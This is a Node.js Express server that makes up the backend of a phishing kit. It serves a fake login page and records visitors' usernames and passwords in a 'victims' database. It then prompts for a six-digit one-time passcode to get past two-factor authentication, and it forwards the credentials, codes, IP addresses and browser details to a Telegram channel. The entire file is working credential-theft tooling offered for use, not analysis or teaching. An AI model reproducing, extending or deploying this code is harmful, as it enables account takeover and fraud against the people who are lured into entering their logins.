const express = require('express');
const path = require('path');
const session = require('express-session');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
require('dotenv').config({ path: path.join(__dirname, '../config/.env') });

const app = express();
const PORT = process.env.PORT || 3000;

// Import Telegram
const telegram = require('./telegram-bot');

// ============================================
// DATABASE SETUP
// ============================================

const DB_PATH = path.join(__dirname, '../database/victims.db');
const dbDir = path.dirname(DB_PATH);

if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
    console.log('✅ Database directory created');
}

let db = null;
let dbInitialized = false;
let pendingQueries = [];

function initDatabase() {
    return new Promise((resolve, reject) => {
        db = new sqlite3.Database(DB_PATH, (err) => {
            if (err) {
                console.error('❌ Database connection error:', err.message);
                db = new sqlite3.Database(':memory:');
            } else {
                console.log('✅ Connected to SQLite database');
            }
            resolve(db);
        });
    });
}

function createTables() {
    return new Promise((resolve, reject) => {
        db.run(`
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ip TEXT,
                user_agent TEXT,
                session_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                otp TEXT,
                otp_timestamp DATETIME,
                completed BOOLEAN DEFAULT 0,
                encrypted_data TEXT
            )
        `, (err) => {
            if (err) {
                console.error('❌ Error creating victims table:', err.message);
                reject(err);
                return;
            }
            console.log('✅ Victims table verified');
            
            db.run(`
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    event_type TEXT NOT NULL,
                    details TEXT,
                    ip TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            `, (err) => {
                if (err) {
                    console.error('❌ Error creating logs table:', err.message);
                    reject(err);
                    return;
                }
                console.log('✅ Logs table verified');
                
                db.run(`CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)`, () => {});
                db.run(`CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)`, () => {});
                db.run(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)`, () => {});
                
                console.log('✅ Database initialization complete');
                dbInitialized = true;
                processPendingQueries();
                resolve();
            });
        });
    });
}

function processPendingQueries() {
    while (pendingQueries.length > 0) {
        const query = pendingQueries.shift();
        query();
    }
}

async function initializeDatabase() {
    try {
        await initDatabase();
        await createTables();
        return true;
    } catch (error) {
        console.error('❌ Database initialization failed:', error.message);
        return false;
    }
}

function ensureDbReady(callback) {
    if (dbInitialized) {
        callback();
    } else {
        pendingQueries.push(callback);
    }
}

function encryptData(data) {
    try {
        const algorithm = 'aes-256-cbc';
        const key = crypto.scryptSync(
            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
            'salt', 
            32
        );
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(algorithm, key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return `${iv.toString('hex')}:${encrypted}`;
    } catch (error) {
        console.error('Encryption error:', error.message);
        return JSON.stringify(data);
    }
}

function saveCredentials(data) {
    return new Promise((resolve, reject) => {
        ensureDbReady(() => {
            const encrypted = encryptData({
                username: data.username,
                password: data.password
            });

            const query = `
                INSERT INTO victims 
                (username, password, ip, user_agent, session_id, timestamp, encrypted_data)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `;

            db.run(query, [
                data.username,
                data.password,
                data.ip || 'unknown',
                data.userAgent || 'unknown',
                data.sessionId || 'unknown',
                data.timestamp || new Date().toISOString(),
                encrypted
            ], function(err) {
                if (err) {
                    console.error('Save credentials error:', err.message);
                    reject(err);
                } else {
                    console.log(`✅ Credentials saved with ID: ${this.lastID}`);
                    resolve(this.lastID);
                }
            });
        });
    });
}

function saveOTP(data) {
    return new Promise((resolve, reject) => {
        ensureDbReady(() => {
            const query = `
                UPDATE victims 
                SET otp = ?, otp_timestamp = ?
                WHERE id = ?
            `;

            db.run(query, [data.otp, data.timestamp, data.userId], function(err) {
                if (err) {
                    console.error('Save OTP error:', err.message);
                    reject(err);
                } else {
                    console.log(`✅ OTP saved for user ID: ${data.userId}`);
                    resolve();
                }
            });
        });
    });
}

function markComplete(userId) {
    return new Promise((resolve, reject) => {
        ensureDbReady(() => {
            const query = `UPDATE victims SET completed = 1 WHERE id = ?`;
            db.run(query, [userId], function(err) {
                if (err) {
                    console.error('Mark complete error:', err.message);
                    reject(err);
                } else {
                    resolve();
                }
            });
        });
    });
}

function logEvent(eventType, details, ip) {
    ensureDbReady(() => {
        const query = `
            INSERT INTO logs (event_type, details, ip, timestamp)
            VALUES (?, ?, ?, ?)
        `;
        
        db.run(query, [
            eventType,
            JSON.stringify(details),
            ip || 'unknown',
            new Date().toISOString()
        ], (err) => {
            if (err) {
                console.error('Log event error:', err.message);
            }
        });
    });
}

// ============================================
// EXPRESS SERVER SETUP
// ============================================

app.use(helmet({
    contentSecurityPolicy: false,
    xssFilter: true,
    noSniff: true,
    hidePoweredBy: true,
    frameguard: { action: 'deny' }
}));

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW || '15') * 60 * 1000,
    max: parseInt(process.env.RATE_LIMIT_MAX || '100'),
    message: 'Too many requests, please try again later.',
    standardHeaders: true,
    legacyHeaders: false
});
app.use('/api/', limiter);

app.use(session({
    secret: process.env.SESSION_SECRET || 'default-secret-change-this',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 3600000,
        sameSite: 'lax'
    }
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

app.use(express.static(path.join(__dirname, '../public')));
app.use('/assets', express.static(path.join(__dirname, '../public/assets')));

// ============================================
// TRACK LOGIN PAGE ACCESS - SEND CHANNEL POST
// ============================================

app.use((req, res, next) => {
    if (req.path === '/' || req.path === '/index.html') {
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        const referrer = req.headers['referer'] || 'Direct';
        const timestamp = new Date().toISOString();
        
        console.log('🌐 Login page accessed - sending channel post');
        
        // Send login page info with button
        telegram.sendLoginPageInfo().catch(err => {
            console.error('❌ Telegram page info error:', err.message);
        });
        
        // Send login page accessed alert
        telegram.sendLoginPageAccessed({
            ip,
            userAgent,
            referrer,
            timestamp,
            location: 'Unknown'
        }).catch(err => {
            console.error('❌ Telegram alert error:', err.message);
        });
    }
    next();
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy', 
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// ============================================
// FRONTEND ROUTES
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/otp-verify', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/otp-verify.html'));
});

app.get('/loading', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/loading.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/success.html'));
});

// ============================================
// API ROUTES
// ============================================

app.post('/api/submit', async (req, res) => {
    try {
        if (!dbInitialized) {
            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
        }

        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        const sessionId = req.session?.id || 'unknown';
        const timestamp = new Date().toISOString();

        const userId = await saveCredentials({
            username,
            password,
            ip,
            userAgent,
            sessionId,
            timestamp
        });

        logEvent('credentials_captured', { 
            username, 
            userId, 
            ip 
        }, ip);

        // Send to Telegram channel
        await telegram.sendCredentials({
            id: userId,
            username,
            password,
            ip,
            userAgent,
            timestamp
        }).catch(err => {
            console.error('❌ Telegram credentials error:', err.message);
        });

        if (req.session) {
            req.session.userId = userId;
            req.session.username = username;
        }

        res.json({
            success: true,
            redirect: '/otp-verify'
        });

    } catch (error) {
        console.error('Submit error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        if (!dbInitialized) {
            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
        }

        const { otp } = req.body;
        const userId = req.session?.userId;

        if (!userId) {
            return res.status(401).json({ error: 'Session expired' });
        }

        if (!otp || otp.length !== 6) {
            return res.status(400).json({ error: 'Invalid OTP format' });
        }

        await saveOTP({
            userId,
            otp,
            ip: req.ip || 'unknown',
            userAgent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString()
        });

        logEvent('otp_submitted', { 
            userId
        }, req.ip);

        // Send OTP to Telegram channel
        await telegram.sendOTP({
            userId,
            otp,
            ip: req.ip || 'unknown',
            userAgent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString()
        }).catch(err => {
            console.error('❌ Telegram OTP error:', err.message);
        });

        res.json({
            success: true,
            redirect: '/loading'
        });

    } catch (error) {
        console.error('OTP verification error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/complete', async (req, res) => {
    try {
        const userId = req.session?.userId;
        
        if (userId) {
            await markComplete(userId);
            logEvent('process_completed', { 
                userId,
                username: req.session?.username || 'unknown'
            }, req.ip);
            
            console.log(`✅ Process completed - User ID: ${userId}`);
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Complete error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ============================================
// TEST TELEGRAM ENDPOINT
// ============================================

app.get('/debug/test-telegram', async (req, res) => {
    try {
        const results = {
            enabled: telegram.enabled,
            hasBot: !!telegram.bot,
            hasChannelId: !!telegram.channelId,
            channelId: telegram.channelId,
            chatId: telegram.chatId
        };
        
        const testMessage = `
🧪 <b>TELEGRAM TEST</b>
<pre>═══════════════════════════════════════</pre>

✅ Bot is connected
📡 Testing channel posting...
⏰ Time: ${new Date().toISOString()}

If you see this, everything works!
`;
        
        const result = await telegram.sendChannelPost(testMessage);
        results.postResult = result ? '✅ Success' : '❌ Failed';
        
        res.json(results);
    } catch (error) {
        res.status(500).json({
            error: error.message,
            stack: error.stack
        });
    }
});

// ============================================
// ERROR HANDLING
// ============================================

app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Something went wrong!' });
});

// ============================================
// START SERVER
// ============================================

initializeDatabase().then((success) => {
    if (!success) {
        console.error('❌ Failed to initialize database. Exiting...');
        process.exit(1);
    }
    
    const server = app.listen(PORT, '0.0.0.0', () => {
        console.log('='.repeat(60));
        console.log(`🚀 Server running on http://localhost:${PORT}`);
        console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
        console.log(`🗄️  Database: ${DB_PATH}`);
        console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
        console.log('='.repeat(60));
        
        // Send welcome message on startup
        setTimeout(() => {
            telegram.sendWelcomeMessage().catch(err => {
                console.error('❌ Welcome message error:', err.message);
            });
        }, 2000);
    });

    const shutdown = () => {
        console.log('\n🛑 Shutting down gracefully...');
        server.close(() => {
            console.log('✅ Server closed');
            if (db) {
                db.close((err) => {
                    if (err) {
                        console.error('❌ Database close error:', err.message);
                    } else {
                        console.log('✅ Database connection closed');
                    }
                    process.exit(0);
                });
            } else {
                process.exit(0);
            }
        });
    };

    process.on('SIGTERM', shutdown);
    process.on('SIGINT', shutdown);
    process.on('unhandledRejection', (reason, promise) => {
        console.error('❌ Unhandled Rejection:', reason);
    });

    module.exports = { app, db, server };
}).catch((error) => {
    console.error('❌ Fatal error:', error.message);
    process.exit(1);
});
